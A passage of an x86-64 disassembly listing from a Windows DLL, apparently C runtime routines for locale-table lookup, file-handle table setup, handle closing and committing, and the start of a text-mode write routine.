   18000c419:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000c41e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000c423:	57                   	push   %rdi
   18000c424:	41 56                	push   %r14
   18000c426:	41 57                	push   %r15
   18000c428:	48 83 ec 20          	sub    $0x20,%rsp
   18000c42c:	4c 8b f1             	mov    %rcx,%r14
   18000c42f:	48 85 c9             	test   %rcx,%rcx
   18000c432:	74 74                	je     0x18000c4a8
   18000c434:	33 db                	xor    %ebx,%ebx
   18000c436:	4c 8d 3d c3 3b ff ff 	lea    -0xc43d(%rip),%r15        # 0x180000000
   18000c43d:	bf e3 00 00 00       	mov    $0xe3,%edi
   18000c442:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   18000c445:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   18000c44b:	99                   	cltd
   18000c44c:	49 8b ce             	mov    %r14,%rcx
   18000c44f:	2b c2                	sub    %edx,%eax
   18000c451:	d1 f8                	sar    $1,%eax
   18000c453:	48 63 e8             	movslq %eax,%rbp
   18000c456:	48 8b d5             	mov    %rbp,%rdx
   18000c459:	48 8b f5             	mov    %rbp,%rsi
   18000c45c:	48 03 d2             	add    %rdx,%rdx
   18000c45f:	49 8b 94 d7 10 44 01 	mov    0x14410(%r15,%rdx,8),%rdx
   18000c466:	00 
   18000c467:	e8 2c 17 00 00       	call   0x18000db98
   18000c46c:	85 c0                	test   %eax,%eax
   18000c46e:	74 13                	je     0x18000c483
   18000c470:	79 05                	jns    0x18000c477
   18000c472:	8d 7d ff             	lea    -0x1(%rbp),%edi
   18000c475:	eb 03                	jmp    0x18000c47a
   18000c477:	8d 5d 01             	lea    0x1(%rbp),%ebx
   18000c47a:	3b df                	cmp    %edi,%ebx
   18000c47c:	7e c4                	jle    0x18000c442
   18000c47e:	83 c8 ff             	or     $0xffffffff,%eax
   18000c481:	eb 0b                	jmp    0x18000c48e
   18000c483:	48 03 f6             	add    %rsi,%rsi
   18000c486:	41 8b 84 f7 18 44 01 	mov    0x14418(%r15,%rsi,8),%eax
   18000c48d:	00 
   18000c48e:	85 c0                	test   %eax,%eax
   18000c490:	78 16                	js     0x18000c4a8
   18000c492:	3d e4 00 00 00       	cmp    $0xe4,%eax
   18000c497:	73 0f                	jae    0x18000c4a8
   18000c499:	48 98                	cltq
   18000c49b:	48 03 c0             	add    %rax,%rax
   18000c49e:	41 8b 84 c7 b0 29 01 	mov    0x129b0(%r15,%rax,8),%eax
   18000c4a5:	00 
   18000c4a6:	eb 02                	jmp    0x18000c4aa
   18000c4a8:	33 c0                	xor    %eax,%eax
   18000c4aa:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000c4af:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000c4b4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000c4b9:	48 83 c4 20          	add    $0x20,%rsp
   18000c4bd:	41 5f                	pop    %r15
   18000c4bf:	41 5e                	pop    %r14
   18000c4c1:	5f                   	pop    %rdi
   18000c4c2:	c3                   	ret
   18000c4c3:	cc                   	int3
   18000c4c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c4c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000c4ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000c4d3:	57                   	push   %rdi
   18000c4d4:	48 83 ec 20          	sub    $0x20,%rsp
   18000c4d8:	ba 48 00 00 00       	mov    $0x48,%edx
   18000c4dd:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   18000c4e0:	e8 37 bd ff ff       	call   0x18000821c
   18000c4e5:	33 f6                	xor    %esi,%esi
   18000c4e7:	48 8b d8             	mov    %rax,%rbx
   18000c4ea:	48 85 c0             	test   %rax,%rax
   18000c4ed:	74 5b                	je     0x18000c54a
   18000c4ef:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   18000c4f6:	48 3b c5             	cmp    %rbp,%rax
   18000c4f9:	74 4c                	je     0x18000c547
   18000c4fb:	48 8d 78 30          	lea    0x30(%rax),%rdi
   18000c4ff:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   18000c503:	45 33 c0             	xor    %r8d,%r8d
   18000c506:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000c50b:	e8 08 db ff ff       	call   0x18000a018
   18000c510:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   18000c515:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   18000c519:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   18000c51d:	8b c6                	mov    %esi,%eax
   18000c51f:	48 89 37             	mov    %rsi,(%rdi)
   18000c522:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   18000c529:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   18000c52d:	40 88 31             	mov    %sil,(%rcx)
   18000c530:	ff c0                	inc    %eax
   18000c532:	48 ff c1             	inc    %rcx
   18000c535:	83 f8 05             	cmp    $0x5,%eax
   18000c538:	72 f3                	jb     0x18000c52d
   18000c53a:	48 83 c7 48          	add    $0x48,%rdi
   18000c53e:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   18000c542:	48 3b c5             	cmp    %rbp,%rax
   18000c545:	75 b8                	jne    0x18000c4ff
   18000c547:	48 8b f3             	mov    %rbx,%rsi
   18000c54a:	33 c9                	xor    %ecx,%ecx
   18000c54c:	e8 43 bd ff ff       	call   0x180008294
   18000c551:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c556:	48 8b c6             	mov    %rsi,%rax
   18000c559:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000c55e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000c563:	48 83 c4 20          	add    $0x20,%rsp
   18000c567:	5f                   	pop    %rdi
   18000c568:	c3                   	ret
   18000c569:	cc                   	int3
   18000c56a:	cc                   	int3
   18000c56b:	cc                   	int3
   18000c56c:	48 85 c9             	test   %rcx,%rcx
   18000c56f:	74 4a                	je     0x18000c5bb
   18000c571:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c576:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c57b:	57                   	push   %rdi
   18000c57c:	48 83 ec 20          	sub    $0x20,%rsp
   18000c580:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   18000c587:	48 8b d9             	mov    %rcx,%rbx
   18000c58a:	48 8b f9             	mov    %rcx,%rdi
   18000c58d:	48 3b ce             	cmp    %rsi,%rcx
   18000c590:	74 12                	je     0x18000c5a4
   18000c592:	48 8b cf             	mov    %rdi,%rcx
   18000c595:	ff 15 4d 3b 00 00    	call   *0x3b4d(%rip)        # 0x1800100e8
   18000c59b:	48 83 c7 48          	add    $0x48,%rdi
   18000c59f:	48 3b fe             	cmp    %rsi,%rdi
   18000c5a2:	75 ee                	jne    0x18000c592
   18000c5a4:	48 8b cb             	mov    %rbx,%rcx
   18000c5a7:	e8 e8 bc ff ff       	call   0x180008294
   18000c5ac:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c5b1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000c5b6:	48 83 c4 20          	add    $0x20,%rsp
   18000c5ba:	5f                   	pop    %rdi
   18000c5bb:	c3                   	ret
   18000c5bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c5c1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c5c6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000c5cb:	41 57                	push   %r15
   18000c5cd:	48 83 ec 30          	sub    $0x30,%rsp
   18000c5d1:	8b f1                	mov    %ecx,%esi
   18000c5d3:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   18000c5d9:	72 29                	jb     0x18000c604
   18000c5db:	e8 1c bc ff ff       	call   0x1800081fc
   18000c5e0:	bb 09 00 00 00       	mov    $0x9,%ebx
   18000c5e5:	89 18                	mov    %ebx,(%rax)
   18000c5e7:	e8 50 a0 ff ff       	call   0x18000663c
   18000c5ec:	8b c3                	mov    %ebx,%eax
   18000c5ee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000c5f3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000c5f8:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   18000c5fd:	48 83 c4 30          	add    $0x30,%rsp
   18000c601:	41 5f                	pop    %r15
   18000c603:	c3                   	ret
   18000c604:	33 ff                	xor    %edi,%edi
   18000c606:	8d 4f 07             	lea    0x7(%rdi),%ecx
   18000c609:	e8 8a ba ff ff       	call   0x180008098
   18000c60e:	90                   	nop
   18000c60f:	8b df                	mov    %edi,%ebx
   18000c611:	8b 05 19 f6 00 00    	mov    0xf619(%rip),%eax        # 0x18001bc30
   18000c617:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000c61c:	3b f0                	cmp    %eax,%esi
   18000c61e:	7c 36                	jl     0x18000c656
   18000c620:	4c 8d 3d 09 f2 00 00 	lea    0xf209(%rip),%r15        # 0x18001b830
   18000c627:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   18000c62b:	74 02                	je     0x18000c62f
   18000c62d:	eb 22                	jmp    0x18000c651
   18000c62f:	e8 90 fe ff ff       	call   0x18000c4c4
   18000c634:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   18000c638:	48 85 c0             	test   %rax,%rax
   18000c63b:	75 05                	jne    0x18000c642
   18000c63d:	8d 78 0c             	lea    0xc(%rax),%edi
   18000c640:	eb 14                	jmp    0x18000c656
   18000c642:	8b 05 e8 f5 00 00    	mov    0xf5e8(%rip),%eax        # 0x18001bc30
   18000c648:	83 c0 40             	add    $0x40,%eax
   18000c64b:	89 05 df f5 00 00    	mov    %eax,0xf5df(%rip)        # 0x18001bc30
   18000c651:	48 ff c3             	inc    %rbx
   18000c654:	eb c1                	jmp    0x18000c617
   18000c656:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000c65b:	e8 8c ba ff ff       	call   0x1800080ec
   18000c660:	8b c7                	mov    %edi,%eax
   18000c662:	eb 8a                	jmp    0x18000c5ee
   18000c664:	48 63 d1             	movslq %ecx,%rdx
   18000c667:	4c 8d 05 c2 f1 00 00 	lea    0xf1c2(%rip),%r8        # 0x18001b830
   18000c66e:	48 8b c2             	mov    %rdx,%rax
   18000c671:	83 e2 3f             	and    $0x3f,%edx
   18000c674:	48 c1 f8 06          	sar    $0x6,%rax
   18000c678:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   18000c67c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c680:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000c684:	48 ff 25 4d 3a 00 00 	rex.W jmp *0x3a4d(%rip)        # 0x1800100d8
   18000c68b:	cc                   	int3
   18000c68c:	48 63 d1             	movslq %ecx,%rdx
   18000c68f:	4c 8d 05 9a f1 00 00 	lea    0xf19a(%rip),%r8        # 0x18001b830
   18000c696:	48 8b c2             	mov    %rdx,%rax
   18000c699:	83 e2 3f             	and    $0x3f,%edx
   18000c69c:	48 c1 f8 06          	sar    $0x6,%rax
   18000c6a0:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   18000c6a4:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c6a8:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000c6ac:	48 ff 25 2d 3a 00 00 	rex.W jmp *0x3a2d(%rip)        # 0x1800100e0
   18000c6b3:	cc                   	int3
   18000c6b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c6b9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c6be:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000c6c3:	41 56                	push   %r14
   18000c6c5:	48 83 ec 20          	sub    $0x20,%rsp
   18000c6c9:	48 63 d9             	movslq %ecx,%rbx
   18000c6cc:	85 c9                	test   %ecx,%ecx
   18000c6ce:	78 72                	js     0x18000c742
   18000c6d0:	3b 1d 5a f5 00 00    	cmp    0xf55a(%rip),%ebx        # 0x18001bc30
   18000c6d6:	73 6a                	jae    0x18000c742
   18000c6d8:	48 8b c3             	mov    %rbx,%rax
   18000c6db:	4c 8d 35 4e f1 00 00 	lea    0xf14e(%rip),%r14        # 0x18001b830
   18000c6e2:	83 e0 3f             	and    $0x3f,%eax
   18000c6e5:	48 8b f3             	mov    %rbx,%rsi
   18000c6e8:	48 c1 fe 06          	sar    $0x6,%rsi
   18000c6ec:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   18000c6f0:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   18000c6f4:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   18000c6f9:	74 47                	je     0x18000c742
   18000c6fb:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   18000c701:	74 3f                	je     0x18000c742
   18000c703:	e8 dc 14 00 00       	call   0x18000dbe4
   18000c708:	83 f8 01             	cmp    $0x1,%eax
   18000c70b:	75 27                	jne    0x18000c734
   18000c70d:	85 db                	test   %ebx,%ebx
   18000c70f:	74 16                	je     0x18000c727
   18000c711:	2b d8                	sub    %eax,%ebx
   18000c713:	74 0b                	je     0x18000c720
   18000c715:	3b d8                	cmp    %eax,%ebx
   18000c717:	75 1b                	jne    0x18000c734
   18000c719:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   18000c71e:	eb 0c                	jmp    0x18000c72c
   18000c720:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000c725:	eb 05                	jmp    0x18000c72c
   18000c727:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   18000c72c:	33 d2                	xor    %edx,%edx
   18000c72e:	ff 15 c4 3a 00 00    	call   *0x3ac4(%rip)        # 0x1800101f8
   18000c734:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   18000c738:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   18000c73e:	33 c0                	xor    %eax,%eax
   18000c740:	eb 16                	jmp    0x18000c758
   18000c742:	e8 b5 ba ff ff       	call   0x1800081fc
   18000c747:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c74d:	e8 8a ba ff ff       	call   0x1800081dc
   18000c752:	83 20 00             	andl   $0x0,(%rax)
   18000c755:	83 c8 ff             	or     $0xffffffff,%eax
   18000c758:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c75d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000c762:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   18000c767:	48 83 c4 20          	add    $0x20,%rsp
   18000c76b:	41 5e                	pop    %r14
   18000c76d:	c3                   	ret
   18000c76e:	cc                   	int3
   18000c76f:	cc                   	int3
   18000c770:	48 83 ec 28          	sub    $0x28,%rsp
   18000c774:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000c777:	75 15                	jne    0x18000c78e
   18000c779:	e8 5e ba ff ff       	call   0x1800081dc
   18000c77e:	83 20 00             	andl   $0x0,(%rax)
   18000c781:	e8 76 ba ff ff       	call   0x1800081fc
   18000c786:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c78c:	eb 4e                	jmp    0x18000c7dc
   18000c78e:	85 c9                	test   %ecx,%ecx
   18000c790:	78 32                	js     0x18000c7c4
   18000c792:	3b 0d 98 f4 00 00    	cmp    0xf498(%rip),%ecx        # 0x18001bc30
   18000c798:	73 2a                	jae    0x18000c7c4
   18000c79a:	48 63 c9             	movslq %ecx,%rcx
   18000c79d:	4c 8d 05 8c f0 00 00 	lea    0xf08c(%rip),%r8        # 0x18001b830
   18000c7a4:	48 8b c1             	mov    %rcx,%rax
   18000c7a7:	83 e1 3f             	and    $0x3f,%ecx
   18000c7aa:	48 c1 f8 06          	sar    $0x6,%rax
   18000c7ae:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   18000c7b2:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c7b6:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   18000c7bb:	74 07                	je     0x18000c7c4
   18000c7bd:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   18000c7c2:	eb 1c                	jmp    0x18000c7e0
   18000c7c4:	e8 13 ba ff ff       	call   0x1800081dc
   18000c7c9:	83 20 00             	andl   $0x0,(%rax)
   18000c7cc:	e8 2b ba ff ff       	call   0x1800081fc
   18000c7d1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c7d7:	e8 60 9e ff ff       	call   0x18000663c
   18000c7dc:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000c7e0:	48 83 c4 28          	add    $0x28,%rsp
   18000c7e4:	c3                   	ret
   18000c7e5:	cc                   	int3
   18000c7e6:	cc                   	int3
   18000c7e7:	cc                   	int3
   18000c7e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c7ed:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000c7f2:	57                   	push   %rdi
   18000c7f3:	48 83 ec 20          	sub    $0x20,%rsp
   18000c7f7:	49 8b f9             	mov    %r9,%rdi
   18000c7fa:	49 8b d8             	mov    %r8,%rbx
   18000c7fd:	8b 0a                	mov    (%rdx),%ecx
   18000c7ff:	e8 60 fe ff ff       	call   0x18000c664
   18000c804:	90                   	nop
   18000c805:	48 8b 03             	mov    (%rbx),%rax
   18000c808:	48 63 08             	movslq (%rax),%rcx
   18000c80b:	48 8b d1             	mov    %rcx,%rdx
   18000c80e:	48 8b c1             	mov    %rcx,%rax
   18000c811:	48 c1 f8 06          	sar    $0x6,%rax
   18000c815:	4c 8d 05 14 f0 00 00 	lea    0xf014(%rip),%r8        # 0x18001b830
   18000c81c:	83 e2 3f             	and    $0x3f,%edx
   18000c81f:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000c823:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c827:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   18000c82c:	74 24                	je     0x18000c852
   18000c82e:	e8 3d ff ff ff       	call   0x18000c770
   18000c833:	48 8b c8             	mov    %rax,%rcx
   18000c836:	ff 15 c4 39 00 00    	call   *0x39c4(%rip)        # 0x180010200
   18000c83c:	33 db                	xor    %ebx,%ebx
   18000c83e:	85 c0                	test   %eax,%eax
   18000c840:	75 1e                	jne    0x18000c860
   18000c842:	e8 95 b9 ff ff       	call   0x1800081dc
   18000c847:	48 8b d8             	mov    %rax,%rbx
   18000c84a:	ff 15 70 38 00 00    	call   *0x3870(%rip)        # 0x1800100c0
   18000c850:	89 03                	mov    %eax,(%rbx)
   18000c852:	e8 a5 b9 ff ff       	call   0x1800081fc
   18000c857:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c85d:	83 cb ff             	or     $0xffffffff,%ebx
   18000c860:	8b 0f                	mov    (%rdi),%ecx
   18000c862:	e8 25 fe ff ff       	call   0x18000c68c
   18000c867:	8b c3                	mov    %ebx,%eax
   18000c869:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c86e:	48 83 c4 20          	add    $0x20,%rsp
   18000c872:	5f                   	pop    %rdi
   18000c873:	c3                   	ret
   18000c874:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000c878:	48 83 ec 38          	sub    $0x38,%rsp
   18000c87c:	48 63 d1             	movslq %ecx,%rdx
   18000c87f:	83 fa fe             	cmp    $0xfffffffe,%edx
   18000c882:	75 0d                	jne    0x18000c891
   18000c884:	e8 73 b9 ff ff       	call   0x1800081fc
   18000c889:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c88f:	eb 6c                	jmp    0x18000c8fd
   18000c891:	85 c9                	test   %ecx,%ecx
   18000c893:	78 58                	js     0x18000c8ed
   18000c895:	3b 15 95 f3 00 00    	cmp    0xf395(%rip),%edx        # 0x18001bc30
   18000c89b:	73 50                	jae    0x18000c8ed
   18000c89d:	48 8b ca             	mov    %rdx,%rcx
   18000c8a0:	4c 8d 05 89 ef 00 00 	lea    0xef89(%rip),%r8        # 0x18001b830
   18000c8a7:	83 e1 3f             	and    $0x3f,%ecx
   18000c8aa:	48 8b c2             	mov    %rdx,%rax
   18000c8ad:	48 c1 f8 06          	sar    $0x6,%rax
   18000c8b1:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000c8b5:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000c8b9:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   18000c8be:	74 2d                	je     0x18000c8ed
   18000c8c0:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000c8c5:	89 54 24 50          	mov    %edx,0x50(%rsp)
   18000c8c9:	89 54 24 58          	mov    %edx,0x58(%rsp)
   18000c8cd:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000c8d2:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   18000c8d7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c8dc:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000c8e1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000c8e6:	e8 fd fe ff ff       	call   0x18000c7e8
   18000c8eb:	eb 13                	jmp    0x18000c900
   18000c8ed:	e8 0a b9 ff ff       	call   0x1800081fc
   18000c8f2:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000c8f8:	e8 3f 9d ff ff       	call   0x18000663c
   18000c8fd:	83 c8 ff             	or     $0xffffffff,%eax
   18000c900:	48 83 c4 38          	add    $0x38,%rsp
   18000c904:	c3                   	ret
   18000c905:	cc                   	int3
   18000c906:	cc                   	int3
   18000c907:	cc                   	int3
   18000c908:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c90d:	55                   	push   %rbp
   18000c90e:	56                   	push   %rsi
   18000c90f:	57                   	push   %rdi
   18000c910:	41 54                	push   %r12
   18000c912:	41 55                	push   %r13
   18000c914:	41 56                	push   %r14
   18000c916:	41 57                	push   %r15
   18000c918:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   18000c91d:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   18000c924:	48 8b 05 e5 d6 00 00 	mov    0xd6e5(%rip),%rax        # 0x18001a010
   18000c92b:	48 33 c4             	xor    %rsp,%rax
   18000c92e:	48 89 45 17          	mov    %rax,0x17(%rbp)
   18000c932:	48 63 f2             	movslq %edx,%rsi
   18000c935:	4d 8b f8             	mov    %r8,%r15
   18000c938:	48 8b c6             	mov    %rsi,%rax
   18000c93b:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   18000c93f:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   18000c943:	48 8d 0d b6 36 ff ff 	lea    -0xc94a(%rip),%rcx        # 0x180000000
   18000c94a:	83 e0 3f             	and    $0x3f,%eax
   18000c94d:	45 8b e9             	mov    %r9d,%r13d
   18000c950:	4d 03 e8             	add    %r8,%r13
   18000c953:	4c 89 45 df          	mov    %r8,-0x21(%rbp)
   18000c957:	4c 8b e6             	mov    %rsi,%r12
   18000c95a:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   18000c95e:	49 c1 fc 06          	sar    $0x6,%r12
   18000c962:	4c 8d 34 c0          	lea    (%rax,%rax,8),%r14
   18000c966:	4a 8b 84 e1 30 b8 01 	mov    0x1b830(%rcx,%r12,8),%rax
   18000c96d:	00 
   18000c96e:	4a 8b 44 f0 28       	mov    0x28(%rax,%r14,8),%rax
   18000c973:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   18000c977:	ff 15 93 38 00 00    	call   *0x3893(%rip)        # 0x180010210
   18000c97d:	33 d2                	xor    %edx,%edx
   18000c97f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000c984:	89 45 a7             	mov    %eax,-0x59(%rbp)
   18000c987:	e8 08 af ff ff       	call   0x180007894
   18000c98c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   18000c991:	45 33 db             	xor    %r11d,%r11d
   18000c994:	44 89 5d 97          	mov    %r11d,-0x69(%rbp)
   18000c998:	41 8b db             	mov    %r11d,%ebx
   18000c99b:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   18000c99e:	49 8b ff             	mov    %r15,%rdi
   18000c9a1:	8b 51 0c             	mov    0xc(%rcx),%edx
   18000c9a4:	41 8b cb             	mov    %r11d,%ecx
   18000c9a7:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   18000c9ab:	89 55 ab             	mov    %edx,-0x55(%rbp)
   18000c9ae:	4d 3b fd             	cmp    %r13,%r15
   18000c9b1:	0f 83 e2 03 00 00    	jae    0x18000cd99
   18000c9b7:	48 8b c6             	mov    %rsi,%rax
   18000c9ba:	49 8b f7             	mov    %r15,%rsi
   18000c9bd:	48 c1 f8 06          	sar    $0x6,%rax
   18000c9c1:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   18000c9c5:	8a 0f                	mov    (%rdi),%cl
   18000c9c7:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   18000c9cd:	88 4c 24 44          	mov    %cl,0x44(%rsp)
   18000c9d1:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   18000c9d6:	81 fa e9 fd 00 00    	cmp    $0xfde9,%edx
   18000c9dc:	0f 85 70 01 00 00    	jne    0x18000cb52
   18000c9e2:	4c 8d 3d 17 36 ff ff 	lea    -0xc9e9(%rip),%r15        # 0x180000000
   18000c9e9:	41 8b d3             	mov    %r11d,%edx
   18000c9ec:	4d 8b 8c c7 30 b8 01 	mov    0x1b830(%r15,%rax,8),%r9
   18000c9f3:	00 
   18000c9f4:	49 8b f3             	mov    %r11,%rsi
   18000c9f7:	4b 8d 04 f1          	lea    (%r9,%r14,8),%rax
   18000c9fb:	44 38 5c 30 3e       	cmp    %r11b,0x3e(%rax,%rsi,1)
   18000ca00:	74 0b                	je     0x18000ca0d
   18000ca02:	ff c2                	inc    %edx
   18000ca04:	48 ff c6             	inc    %rsi
   18000ca07:	48 83 fe 05          	cmp    $0x5,%rsi
   18000ca0b:	7c ee                	jl     0x18000c9fb
   18000ca0d:	48 85 f6             	test   %rsi,%rsi
   18000ca10:	0f 8e e0 00 00 00    	jle    0x18000caf6
   18000ca16:	4b 8b 84 e7 30 b8 01 	mov    0x1b830(%r15,%r12,8),%rax
   18000ca1d:	00 
   18000ca1e:	4c 8b 45 af          	mov    -0x51(%rbp),%r8
   18000ca22:	4c 2b c7             	sub    %rdi,%r8
   18000ca25:	42 0f b6 4c f0 3e    	movzbl 0x3e(%rax,%r14,8),%ecx
   18000ca2b:	46 0f be bc 39 c0 a8 	movsbl 0x1a8c0(%rcx,%r15,1),%r15d
   18000ca32:	01 00 
   18000ca34:	41 ff c7             	inc    %r15d
   18000ca37:	45 8b ef             	mov    %r15d,%r13d
   18000ca3a:	44 2b ea             	sub    %edx,%r13d
   18000ca3d:	4d 63 d5             	movslq %r13d,%r10
   18000ca40:	4d 3b d0             	cmp    %r8,%r10
   18000ca43:	0f 8f 78 02 00 00    	jg     0x18000ccc1
   18000ca49:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   18000ca4d:	49 8b d3             	mov    %r11,%rdx
   18000ca50:	4c 2b c8             	sub    %rax,%r9
   18000ca53:	4f 8d 04 f1          	lea    (%r9,%r14,8),%r8
   18000ca57:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   18000ca5b:	48 03 ca             	add    %rdx,%rcx
   18000ca5e:	48 ff c2             	inc    %rdx
   18000ca61:	42 8a 44 01 3e       	mov    0x3e(%rcx,%r8,1),%al
   18000ca66:	88 01                	mov    %al,(%rcx)
   18000ca68:	48 3b d6             	cmp    %rsi,%rdx
   18000ca6b:	7c ea                	jl     0x18000ca57
   18000ca6d:	45 85 ed             	test   %r13d,%r13d
   18000ca70:	7e 15                	jle    0x18000ca87
   18000ca72:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   18000ca76:	4d 8b c2             	mov    %r10,%r8
   18000ca79:	48 03 ce             	add    %rsi,%rcx
   18000ca7c:	48 8b d7             	mov    %rdi,%rdx
   18000ca7f:	e8 2c 93 ff ff       	call   0x180005db0
   18000ca84:	45 33 db             	xor    %r11d,%r11d
   18000ca87:	49 8b d3             	mov    %r11,%rdx
   18000ca8a:	4c 8d 05 6f 35 ff ff 	lea    -0xca91(%rip),%r8        # 0x180000000
   18000ca91:	4b 8b 8c e0 30 b8 01 	mov    0x1b830(%r8,%r12,8),%rcx
   18000ca98:	00 
   18000ca99:	48 03 ca             	add    %rdx,%rcx
   18000ca9c:	48 ff c2             	inc    %rdx
   18000ca9f:	46 88 5c f1 3e       	mov    %r11b,0x3e(%rcx,%r14,8)
   18000caa4:	48 3b d6             	cmp    %rsi,%rdx
   18000caa7:	7c e8                	jl     0x18000ca91
   18000caa9:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   18000caad:	4c 89 5d bf          	mov    %r11,-0x41(%rbp)
   18000cab1:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   18000cab5:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   18000cab9:	41 8b c3             	mov    %r11d,%eax
   18000cabc:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   18000cac0:	41 83 ff 04          	cmp    $0x4,%r15d
